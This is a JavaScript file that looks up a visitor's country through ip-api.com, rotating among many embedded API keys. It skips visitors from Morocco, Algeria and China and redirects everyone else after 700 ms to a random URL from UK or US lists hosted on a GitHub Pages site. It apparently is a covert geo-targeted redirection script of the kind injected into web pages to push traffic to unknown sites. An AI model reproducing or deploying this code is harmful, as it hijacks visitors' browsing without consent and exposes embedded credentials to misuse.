const jsonUrls = [
    'https://pro.ip-api.com/json/?key=6KddQSe576qrfNb',
    'https://pro.ip-api.com/json/?key=U4NdpvcDcxvMekN',
    'https://pro.ip-api.com/json/?key=9908tZlRhI0pK5W',
    'https://pro.ip-api.com/json/?key=WEPQWHzy7RYlxSd',
    'https://pro.ip-api.com/json?key=hmo35qvo5aGzt9n',
    'https://pro.ip-api.com/json?key=kUPOlOOaEvVciQF',
    'https://pro.ip-api.com/json?key=P8PhZi5usLxHF87',
    'https://pro.ip-api.com/json/?key=WMFayXqD09GW5u8',
    'https://pro.ip-api.com/json?key=8sVSGSjc3raQhsX',
    'https://pro.ip-api.com/json?key=E7Rt1oUyF5qA3HC',
    'https://pro.ip-api.com/json?key=oR1iAosgCjiPtQi',
    'https://pro.ip-api.com/json/?key=2tjq7YXrdexnO8N',
    'https://pro.ip-api.com/json/?key=m4a3wr1KiB2OM00',
    'https://pro.ip-api.com/json/?key=OhSlXoSuuSkHptR',
    'https://pro.ip-api.com/json/?key=Ti3uXxtYywQMqZQ',
    'https://pro.ip-api.com/json/?key=qbYk7OjO4GIy9xU',
    'http://pro.ip-api.com/json/?key=xdjZbj0ZiVVozCo',
    'https://pro.ip-api.com/json/?key=SAtoFddpK9OSHLU',
    'https://pro.ip-api.com/json/?key=tZjXsR6xtdknm7C'
];

// Fetch country information from a randomly selected JSON URL
const randomIndex = Math.floor(Math.random() * jsonUrls.length);
const randomUrl = jsonUrls[randomIndex];

// Fetch country information using a third-party API
fetch(randomUrl)
    .then(response => response.json())
    .then(data => {
        let countryCode;
    
        // Check if the response contains country code
        if (data.ip.country_code) {
            countryCode = data.ip.country_code;
            console.log('country:', countryCode);
        }

        else if (data.country_code) {
            countryCode = data.country_code;
            console.log('country_code:', countryCode);
        }
        else if (data.countryCode) {
            countryCode = data.countryCode;
            console.log('country_code:', countryCode);
        }
        else if (data.country_code2) {
            countryCode = data.country_code2;
            console.log('country_code:', countryCode);
        }
        // Check if the response contains country
        else if (data.country) {
            countryCode = data.country;
            console.log('country:', countryCode);
        }
    
        // Perform country-based redirection using country code or country
        performCountryRedirection(countryCode);
        })
    .catch(error => {
        // Handle error if the API request fails
        console.error('Error:', error);
        // Redirect to a default page if the country detection fails
        redirectToRandomUrl();
        });

// Function to perform country-based redirection
function performCountryRedirection(countryCode) {
    if (countryCode === 'GB') {
        fetchUrls('https://hellonetwork2023.github.io/uk/ukurls.json');
      } else if (countryCode === 'MA' || countryCode === 'DZ' || countryCode === 'CN') {
        return;
      }else {
        fetchUrls('https://hellonetwork2023.github.io/us/usurls.json');
      }
    }

function fetchUrls(jsonFile) {
    fetch(jsonFile)
    .then(response => response.json())
    .then(data => {
        const urls = data.urls.map(site => site.url);
        const randomIndex = Math.floor(Math.random() * urls.length);
        const randomUrl = urls[randomIndex];
        setTimeout(function () {
            window.location.href = randomUrl;
        }, 700);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
